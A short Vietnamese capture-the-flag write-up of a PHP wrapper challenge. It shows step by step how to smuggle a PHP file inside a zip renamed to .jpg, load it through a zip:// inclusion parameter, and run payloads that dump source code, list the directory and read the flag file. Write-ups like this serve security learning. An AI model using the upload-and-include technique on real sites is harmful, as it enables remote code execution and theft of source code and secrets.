PHP wrapper không mới, thực tế ta đã biết đến nó qua những chall như `PHP-filters` , `LFI- Double encoding`, vậy thử dùng lại những wrappers đó, ta thấy `filter` bị văng ra "attack detected", còn `zip` thì chạy ok. Thao tác tấn công như sau:

- Tạo 1 file php với code như sau:

  ```php
  <?php show_source('index.php') ?>
  ```

- Lưu file với tên a.php(chỉ nên dùng 1 chữ cái vì có thêm filter `page name too long`), zip lại và đổi tên file thành a.jpg để bypass file upload, may mắn chall này không có nhiều filter file upload như những chall trước

- Upload lên server, truy cập đường dẫn sau:

  > ?page=zip://path_to_file_zip%23php_file_name
  >
  > ?page=zip://tmp/upload/2EXM3tORM.jpg%23a

Và sẽ có được source của index.php, tuy nhiên trong đây không có flag

- Viết 1 code php khác để soát xem trong folder này còn gì không

  ```php
   <?php
  $dir = "./";
  
  // Sort in ascending order - this is default
  $a = scandir($dir);
  print_r($a);
  ?> 
  ```

  lặp lại những thao tác trên, ta có được kết quả:

  > Array (    [0] => .    [1] => ..    [2] => ._nginx.http-level.inc    [3] => ._nginx.server-level.inc    [4] => ._php-fpm.pool.inc    [5] => ._run    [6] => flag-mipkBswUppqwXlq9ZydO.php    [7] => index.php    [8] => tmp    [9] => upload.php    [10] => view.php ) 

- Vậy lại sửa code php lần 3:

  ```
  <?php show_source('flag-mipkBswUppqwXlq9ZydO.php') ?>
  ```

  Upload file và ta có được flag

